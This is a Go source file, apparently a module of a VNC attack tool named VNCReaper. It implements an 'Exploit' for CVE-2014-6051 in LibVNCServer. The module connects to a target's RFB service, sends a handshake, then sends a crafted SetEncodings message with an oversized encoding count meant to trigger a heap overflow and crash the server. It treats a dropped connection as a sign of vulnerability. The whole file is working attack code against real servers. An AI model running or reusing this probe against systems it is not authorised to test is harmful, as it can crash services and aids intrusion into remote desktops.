package cves

import (
	"fmt"
	"net"
	"time"

	"github.com/comedymoon/VNCReaper/internal/types"
)

// CVE-2014-6051 - LibVNCServer heap buffer overflow in SetEncodings
type CVE20146051 struct{}

func (c CVE20146051) Name() string {
	return "CVE-2014-6051"
}

func (c CVE20146051) Description() string {
	return "LibVNCServer heap buffer overflow via crafted SetEncodings message."
}

func (c CVE20146051) Exploit(target types.ScanResult) (bool, string) {
	if target.Protocol != "RFB" {
		return false, ""
	}

	addr := fmt.Sprintf("%s:%s", target.IP, target.Port)
	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	if err != nil {
		return false, ""
	}
	defer conn.Close()

	// Send minimal RFB handshake
	conn.Write([]byte("RFB 003.008\n"))
	buf := make([]byte, 1024)
	conn.Read(buf)

	// Send crafted SetEncodings to trigger potential crash
	payload := []byte{
		2, 0, 0, 0, // SetEncodings message type
		0xFF, 0xFF, // Very large number of encodings (trigger overflow)
	}
	conn.Write(payload)

	// If the connection drops, might be vulnerable
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	n, _ := conn.Read(buf)
	if n == 0 {
		return true, "Server closed connection after crafted SetEncodings (possible CVE-2014-6051)"
	}

	return false, ""
}

func init() {
	Register(CVE20146051{})
}